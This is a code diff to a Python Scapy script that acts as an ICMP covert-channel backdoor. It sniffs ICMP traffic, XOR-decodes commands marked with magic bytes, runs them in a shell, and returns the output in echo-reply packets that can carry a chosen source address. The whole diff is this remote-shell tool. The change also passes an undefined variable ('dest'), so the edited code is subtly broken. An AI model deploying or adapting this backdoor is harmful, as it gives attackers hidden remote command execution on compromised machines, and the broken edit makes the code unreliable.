@@ -29,24 +29,23 @@ ping = "\xaa\xab\xac\xad"
 port = "\xba\xbb\xbc\xbd"
 shell = "\xca\xcb\xcc\xcd"
 
-source = ""
-
 def action(pkt):
 	if hasattr(pkt, "load"):
 		buff = XOR(pkt.load)
 
 		if buff[0:4] == client_magic:
 			source = pkt[IP].src
+			destination = pkt[IP].dst
 			if buff[4:8] == ping:
 				print "Ping"
 			elif buff[4:8] == port:
 				print "Port"
 			elif buff[4:8] == shell:
 				time.sleep(0.1)
-				command_shell(buff[8:], source)
+				command_shell(buff[8:], source, dest)
 
-def packet_builder(data, dest):
-	packet = Ether() / IP(dst=dest) / ICMP(type=0) / (XOR(server_magic + data))
+def packet_builder(data, dest, sour):
+	packet = Ether() / IP(src=sour,dst=dest) / ICMP(type=0) / (XOR(server_magic + data))
 	return packet
 
 def XOR(p):
@@ -55,11 +54,11 @@ def XOR(p):
                 buff += chr(ord(p[i]) ^ ord(xor[i % 4]))
         return buff
 
-def command_shell(data, src):
+def command_shell(data, src, dst):
 	value = ""
 	proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, 
 	stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 	value = proc.stdout.read() + proc.stderr.read()
-	sendp(packet_builder(shell + value + prompt, src),verbose=0,iface=sys.argv[1])
+	sendp(packet_builder(shell + value + prompt, src, dst),verbose=0,iface=sys.argv[1])
 
 sniff(iface=sys.argv[1],filter="icmp",prn=action,store=1)
